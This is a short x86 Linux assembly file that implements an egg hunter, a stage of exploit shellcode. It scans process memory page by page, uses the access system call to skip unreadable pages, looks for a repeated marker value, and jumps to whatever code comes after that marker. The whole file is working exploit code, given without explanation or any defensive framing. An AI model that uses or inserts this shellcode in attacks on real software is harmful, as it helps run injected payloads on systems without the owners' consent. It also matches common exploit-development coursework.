global _start



section .text

_start:

	; initialization
	xor ecx, ecx
	mul ecx
	xor ebx, ebx
	xor esi, esi

next_lpage:
	or dx,0xfff

next_incr:
	inc edx

	;access function  to check permission
	
	xor eax,eax
	mov edi,0x41414141
	mov al,0x21
	lea ebx,[edx+8]
	int 0x80
	cmp al,0xf2
	jz next_lpage

	cmp edi,[edx]
	jnz next_incr

	cmp edi,[edx+4]
	jnz next_incr

	lea esi,[edx+8]
	jmp esi


